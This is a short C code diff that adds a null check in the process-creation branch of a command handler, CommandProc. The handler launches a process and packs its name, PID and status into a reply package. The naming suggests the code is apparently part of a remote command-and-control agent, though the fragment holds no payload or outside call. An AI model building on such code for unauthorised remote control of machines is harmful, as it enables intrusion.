@@ -447,7 +447,10 @@ VOID CommandProc( PPARSER Parser )
             // TODO: make it optional to choose process arch
             Success = ProcessCreate( TRUE, Process, ProcessArgs, ProcessState, &ProcessInfo, ProcessPiped, NULL );
 
-            PackageAddWString( Package, Process );
+            if ( Process )
+                PackageAddWString( Package, Process );
+            else
+                PackageAddBytes( Package, NULL, 0 );
             PackageAddInt32( Package, Success ? ProcessInfo.dwProcessId : 0 );
             PackageAddInt32( Package, Success );
             PackageAddInt32( Package, ProcessPiped );
